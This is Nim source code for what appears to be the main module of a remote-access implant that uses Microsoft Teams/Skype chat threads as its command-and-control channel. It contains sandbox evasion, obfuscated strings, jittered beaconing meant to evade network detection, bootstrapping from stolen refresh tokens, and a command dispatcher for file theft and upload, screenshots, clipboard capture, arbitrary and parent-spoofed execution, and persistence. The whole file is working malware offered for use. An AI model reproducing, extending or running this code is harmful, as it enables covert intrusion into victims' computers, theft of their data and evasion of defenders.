import std/[os, strutils, strformat, json, times, random, locks, threadpool, base64, tables]
import winhttp
import types
import obfuscation
import antisandbox
import crypto
import login
import network
import commands
import appdata
import persistence
import privilege

#################################################################

var gDispatchTokens: TokenDict = nil

proc dispatch*(command: string; tokens: var TokenDict; threadId: string = ""): string =
  ## Parse and execute a command string.
  ## Returns the output as a string (never raises — errors are returned as strings).
  let parts = command.strip().splitWhitespace(maxsplit = 1)
  if parts.len == 0:
    return s("(empty command)")
  let verb   = parts[0].toLowerAscii()
  let argStr = if parts.len > 1: parts[1] else: ""

  try:
    case verb
    of "whoami":    return cmdWhoami()
    of "hostname":  return cmdHostname()
    of "pwd":       return cmdPwd()
    of "getpid":    return cmdGetpid()
    of "uptime":    return cmdUptime()
    of "ls":        return cmdLs(if argStr.len > 0: argStr else: ".")
    of "cat":
      if argStr.len == 0: return s("Usage: cat <path>")
      return cmdCat(argStr)
    of "ps":        return cmdPs()
    of "kill":
      if argStr.len == 0: return s("Usage: kill <pid>")
      return cmdKill(argStr.strip())
    of "sysinfo":   return cmdSysinfo()
    of "drives":    return cmdDrives()
    of "env":       return cmdEnv()
    of "getenv":
      if argStr.len == 0: return s("Usage: getenv <variable>")
      return cmdGetenv(argStr.strip())
    of "mkdir":
      if argStr.len == 0: return s("Usage: mkdir <path>")
      return cmdMkdir(argStr)
    of "rm":
      if argStr.len == 0: return s("Usage: rm <path>")
      return cmdRm(argStr)
    of "mv":
      if argStr.len == 0 or " " notin argStr: return s("Usage: mv <src> <dst>")
      let idx = argStr.rfind(' ')
      return cmdMv(argStr[0 ..< idx].strip(), argStr[idx + 1 .. ^1].strip())
    of "cp":
      if argStr.len == 0 or " " notin argStr: return s("Usage: cp <src> <dst>")
      let idx = argStr.rfind(' ')
      return cmdCp(argStr[0 ..< idx].strip(), argStr[idx + 1 .. ^1].strip())
    of "clipboard": return cmdClipboard()
    of "ipconfig":  return cmdIpconfig()
    of "netstat":   return cmdNetstat()
    of "ping":
      if argStr.len == 0: return s("Usage: ping <host>")
      return cmdPing(argStr.strip())
    of "dns":
      if argStr.len == 0: return s("Usage: dns <host>")
      return cmdDns(argStr.strip())
    of "screenshot":
      return cmdScreenshot(tokens, threadId)
    of "download":
      if argStr.len == 0: return s("Usage: download <path>")
      return cmdDownload(argStr, tokens, threadId)
    of "upload":
      # Protocol: "upload <filename> <b64data>" or "upload <filename> <b64data> ##DEST##<destPath>"
      # The Server appends " ##DEST##<destPath>" when the operator specifies a destination.
      if argStr.len == 0 or " " notin argStr: return s("Usage: upload <filename> <base64_data>")
      let firstSpace  = argStr.find(' ')
      let fname       = argStr[0 ..< firstSpace]
      let rest        = argStr[firstSpace + 1 .. ^1]
      let destMarker  = s("##DEST##")
      let destIdx     = rest.find(destMarker)
      if destIdx >= 0:
        # Destination path provided — split b64 data from dest path
        let b64Data  = rest[0 ..< destIdx].strip()
        let destPath = rest[destIdx + destMarker.len .. ^1].strip()
        return cmdReceiveUpload(fname, b64Data, destPath)
      else:
        return cmdReceiveUpload(fname, rest)
    of "download_url":
      if argStr.len == 0 or " " notin argStr: return s("Usage: download_url <filename> <shareId>")
      let idx = argStr.find(' ')
      return cmdDownloadUrl(argStr[0 ..< idx], argStr[idx + 1 .. ^1].strip(), tokens)
    of "isadmin":   return cmdIsAdmin()
    of "privs":     return cmdPrivs()
    of "persist":
      if argStr.len == 0: return s("Usage: persist <taskname>")
      return installPersistence(argStr.strip())
    of "unpersist":
      if argStr.len == 0: return s("Usage: unpersist <taskname>")
      return removePersistence(argStr.strip())
    of "exec":
      if argStr.len == 0: return s("Usage: exec <cmdline>")
      return cmdExec(argStr)
    of "exec_spoof":
      # Optional second argument: name of the process to impersonate as parent.
      # Default is explorer.exe.
      # Example: exec_spoof calc.exe
      #          exec_spoof cmd.exe svchost.exe
      let spParts = argStr.strip().split(' ', maxsplit = 1)
      let spCmd    = spParts[0]
      let spParent = if spParts.len > 1: spParts[1].strip() else: s("explorer.exe")
      if spCmd.len == 0: return s("Usage: exec_spoof <cmdline> [parent_name]")
      return cmdExecSpoof(argStr, spParent)
    of "help":      return cmdHelp()
    else:
      return s("Unknown command: '") & verb & s("'. Type 'help' for available commands.")
  except Exception as e:
    return s("[EXCEPTION] ") & $e.name & ": " & e.msg

#################################################################
proc heartbeatLoop*(tokensSnapshot: TokenDict; threadId: string; debug: bool = false) {.thread, gcsafe.} =
  var localTokens = tokensSnapshot
  var rng = initRand(getTime().toUnix())
  var seq = 0
  while true:
    let jitter    = rng.rand(-HB_JITTER.float .. HB_JITTER.float)
    let sleepSecs = max(5.0, HB_BASE.float + jitter)
    sleep(int(sleepSecs * 1000))
    inc seq
    let payload = $(%*{"ts": getTime().toUnix(), "seq": seq})
    # Protocol markers decoded at runtime — not stored as plaintext
    let hbMsg   = HB_START() & payload & HB_END()
    try:
      sendRaw(threadId, hbMsg, localTokens, debug)
    except Exception:
      discard  # beacon failures are silent



proc resolveTokenBlob*(blobB64: string; debug: bool = false): JsonNode =
  var raw: seq[byte]
  try:
    let decoded = decode(blobB64.strip())
    raw = cast[seq[byte]](decoded)
  except Exception as e:
    raise newException(IOError, s("blob decode: ") & e.msg)

  var plain: seq[byte]
  try:
    plain = decryptFile(raw)
  except CryptoError as e:
    raise newException(IOError, s("blob decrypt: ") & e.msg)

  try:
    let payload = parseJson(cast[string](plain))
    for key in [s("refresh_token"), s("skype_id"), s("display_name")]:
      if not payload.hasKey(key):
        raise newException(IOError, s("missing key: ") & key)
    return payload
  except JsonParsingError as e:
    raise newException(IOError, s("blob json: ") & e.msg)

proc bootstrapFromLink*(blobB64: string; serverContact: string = "";
                        debug: bool = false): (TokenDict, string, string) =
  const TOKEN_WAIT = 60

  var attempt = 0
  while true:
    inc attempt

    var payload: JsonNode
    try:
      payload = resolveTokenBlob(blobB64, debug)
    except IOError:
      sleep(TOKEN_WAIT * 1000)
      continue

    var tokens = newTokenDict()
    tokens.refreshToken = payload[s("refresh_token")].getStr()
    tokens.skypeId      = payload[s("skype_id")].getStr()
    tokens.displayName  = payload[s("display_name")].getStr()

    try:
      refreshAllTokens(tokens, debug)
    except ValueError as e:
      let msg = e.msg
      if s("invalid_grant") in msg or s("expired") in msg.toLowerAscii():
        sleep(TOKEN_WAIT * 1000)
        continue
      sleep(TOKEN_WAIT * 1000)
      continue

    let effectiveContact = if serverContact.len > 0: serverContact
                           else: payload.getOrDefault(s("server_contact")).getStr()
    if effectiveContact.len == 0:
      raise newException(IOError, s("server_contact missing"))

    var threadId: string
    try:
      threadId = resolveThread(effectiveContact, tokens, debug)
    except IOError:
      sleep(TOKEN_WAIT * 1000)
      continue

    tokens.serverContact = effectiveContact
    return (tokens, threadId, effectiveContact)


proc clientLoop*(tokens: var TokenDict; threadId: string;
                 serverSkypeIdHint: string; debug: bool = false) =

  var hbThread: Thread[tuple[t: TokenDict; tid: string; d: bool]]
  createThread(hbThread, proc(args: tuple[t: TokenDict; tid: string; d: bool]) {.thread.} =
    heartbeatLoop(args.t, args.tid, args.d),
    (t: tokens, tid: threadId, d: debug)
  )

  var lastProcessedId = 0i64

  type ChunkBuf = tuple[total: int; pieces: Table[int, string]; ready: bool]
  var chunkBufs: Table[string, ChunkBuf]
  try:
    let initMsgs = fetchMessages(threadId, tokens, debug = debug)
    if initMsgs.len > 0:
      lastProcessedId = initMsgs[^1].getOrDefault(s("id")).getStr("0").parseBiggestInt()
  except Exception:
    discard

  var rng = initRand(getTime().toUnix())

  while true:
    # Sleep with jitter to avoid regular network pattern detection
    let jitter    = rng.rand(-POLL_JITTER.float .. POLL_JITTER.float)
    let sleepSecs = max(1.0, POLL_BASE.float + jitter)
    sleep(int(sleepSecs * 1000))

    var messages: seq[JsonNode]
    try:
      messages = fetchMessages(threadId, tokens, debug = debug)
    except Exception:
      continue

    for msg in messages:
      let msgId   = msg.getOrDefault(s("id")).getStr("0").parseBiggestInt()
      let content = htmlUnescape(msg.getOrDefault(s("content")).getStr())
      let msgType = msg.getOrDefault(s("type")).getStr()
      let props   = msg.getOrDefault(s("properties"))

      if msgId <= lastProcessedId: continue
      if msgType != s("Message") or (props.kind == JObject and props.hasKey(s("deletetime"))):
        lastProcessedId = max(lastProcessedId, msgId)
        continue

      # Skip own messages
      let fromUrl = msg.getOrDefault(s("from")).getStr()
      if tokens.skypeId.toLowerAscii() in fromUrl.toLowerAscii():
        lastProcessedId = max(lastProcessedId, msgId)
        continue

      # Skip heartbeat beacons
      if HB_START() in content and HB_END() in content:
        lastProcessedId = max(lastProcessedId, msgId)
        continue

      if CHUNK_START_MARKER() in content and CHUNK_END() in content:
        let raw = extractBetween(content, CHUNK_START_MARKER(), CHUNK_END()).strip()
        let pipeIdx = raw.find('|')
        if pipeIdx > 0:
          let filename = raw[0 ..< pipeIdx]
          let totalStr = raw[pipeIdx+1 .. ^1]
          try:
            let total = totalStr.parseInt()
            chunkBufs[filename] = (total: total,
                                   pieces: initTable[int, string](),
                                   ready: false)
          except ValueError:
            discard
        lastProcessedId = max(lastProcessedId, msgId)
        continue

      if CHUNK_START() in content and CHUNK_END() in content:
        let raw = extractBetween(content, CHUNK_START(), CHUNK_END()).strip()
        let pipeIdx1 = raw.find('|')
        let pipeIdx2 = if pipeIdx1 >= 0: raw.find('|', pipeIdx1 + 1) else: -1
        let pipeIdx3 = if pipeIdx2 >= 0: raw.find('|', pipeIdx2 + 1) else: -1
        if pipeIdx1 > 0 and pipeIdx2 > pipeIdx1 and pipeIdx3 > pipeIdx2:
          let filename = raw[0 ..< pipeIdx1]
          let totalStr = raw[pipeIdx1+1 ..< pipeIdx2]
          let idxStr   = raw[pipeIdx2+1 ..< pipeIdx3]
          let b64piece = raw[pipeIdx3+1 .. ^1]
          try:
            let total    = totalStr.parseInt()
            let chunkIdx = idxStr.parseInt()
            # Initialise buffer if CHUNK_START_MARKER was missed
            if filename notin chunkBufs:
              chunkBufs[filename] = (total: total,
                                     pieces: initTable[int, string](),
                                     ready: false)
            chunkBufs[filename].pieces[chunkIdx] = b64piece
          except ValueError:
            discard  
        lastProcessedId = max(lastProcessedId, msgId)
        continue


      if CHUNK_DONE() in content and CHUNK_END() in content:
        let filename = extractBetween(content, CHUNK_DONE(), CHUNK_END()).strip()
        if filename.len > 0 and filename in chunkBufs:
          let buf = chunkBufs[filename]
          var response: string
          # Verify we have all expected chunks before assembling
          if buf.pieces.len == buf.total:
            try:
              # Reassemble base64 in order
              var b64full = ""
              for i in 0 ..< buf.total:
                b64full &= buf.pieces[i]
              chunkBufs.del(filename)

              let encStr   = base64.decode(b64full)
              var encBytes = newSeq[byte](encStr.len)
              for i, c in encStr: encBytes[i] = byte(c)
              # Decrypt AES-256-GCM
              let rawBytes = decryptFile(encBytes)
              # Write to disk
              var rawStr = newString(rawBytes.len)
              for i, b in rawBytes: rawStr[i] = char(b)
              writeFile(filename, rawStr)
              response = OUT_START() & s("Saved: ") & filename &
                         s(" (") & $rawBytes.len & s(" bytes)") & OUT_END()
            except Exception as ex:
              response = ERR_START() & s("chunk_write: ") & ex.msg & ERR_END()
          else:

            let got = buf.pieces.len
            let exp = buf.total
            chunkBufs.del(filename)
            response = ERR_START() & s("chunk_incomplete: got ") & $got &
                       s("/") & $exp & s(" chunks for ") & filename & ERR_END()
          try:
            sendRaw(threadId, response, tokens, debug)
          except Exception:
            discard
        lastProcessedId = max(lastProcessedId, msgId)
        continue


      if BLOB_START() in content and BLOB_END() in content:
        let newBlobB64 = extractBetween(content, BLOB_START(), BLOB_END()).strip()
        if newBlobB64.len > 0:
          if tokens.onNewLink != nil:
            tokens.onNewLink(newBlobB64, tokens.serverContact)
        lastProcessedId = max(lastProcessedId, msgId)
        continue


      if CMD_START() in content and CMD_END() in content:
        let command = extractBetween(content, CMD_START(), CMD_END()).strip()

        # Legacy: set_token_link (backward compat)
        if command.startsWith(s("set_token_link ")):
          var newShareId = command[len(s("set_token_link ")) .. ^1].strip()
          newShareId = htmlUnescape(newShareId)
          if newShareId.len > 0 and tokens.onNewLink != nil:
            tokens.onNewLink(newShareId, tokens.serverContact)
          lastProcessedId = max(lastProcessedId, msgId)
          continue

        # Execute command
        var response: string
        try:
          let output = dispatch(command, tokens, threadId)
          response   = OUT_START() & output & OUT_END()
        except Exception as e:
          response = ERR_START() & $e.name & ": " & e.msg & ERR_END()

        try:
          sendRaw(threadId, response, tokens, debug)
        except Exception:
          discard

      lastProcessedId = max(lastProcessedId, msgId)



proc main() =
  sandboxExit()

  # Single-instance Mutex guard
  if not checkSingleInstance(s("Global\\TeamsC2Mutex_2026")):
    quit(0) # Exit silently if already running


  var
    argLink     = ""
    argUsername = ""
    argPassword = ""
    argContact  = ""
    argDebug    = false

  var i = 1
  while i <= paramCount():
    let a = paramStr(i)
    case a
    of s("-l"), s("--link"):
      inc i; argLink = paramStr(i)
    of s("-u"), s("--username"):
      inc i; argUsername = paramStr(i)
    of s("-p"), s("--password"):
      inc i; argPassword = paramStr(i)
    of s("-c"), s("--contact"):
      inc i; argContact = paramStr(i)
    of s("--debug"):
      argDebug = true
    of s("-h"), s("--help"):
      quit(0)
    else:
      quit(1)
    inc i

  var
    tokens:           TokenDict
    threadId:         string
    effectiveContact: string

  try:
    if argLink.len > 0:
      (tokens, threadId, effectiveContact) = bootstrapFromLink(
        argLink.strip(), argContact.strip(), argDebug
      )
      saveLinkToAppdata(argLink.strip(), effectiveContact)

    else:
      let cached = loadLinkFromAppdata()
      if cached != nil:
        let cachedBlob    = cached[s("url")].getStr()
        let cachedContact = if argContact.len > 0: argContact
                            else: cached.getOrDefault(s("server_contact")).getStr()
        (tokens, threadId, effectiveContact) = bootstrapFromLink(
          cachedBlob, cachedContact, argDebug
        )
        saveLinkToAppdata(cachedBlob, effectiveContact)

      elif argUsername.len > 0 and argPassword.len > 0:
        if argContact.len == 0: quit(1)
        tokens           = login(argUsername, argPassword, argDebug)
        threadId         = resolveThread(argContact.strip(), tokens, argDebug)
        effectiveContact = argContact.strip()
        tokens.serverContact = effectiveContact

      else:
        quit(1)

    # Inject AppData save callback
    tokens.onNewLink = proc(blobB64, contact: string) =
      saveLinkToAppdata(blobB64, contact)

    clientLoop(tokens, threadId, effectiveContact, argDebug)

  except IOError:
    quit(1)
  except ValueError:
    quit(1)
  except CatchableError:
    quit(1)

when isMainModule:
  main()
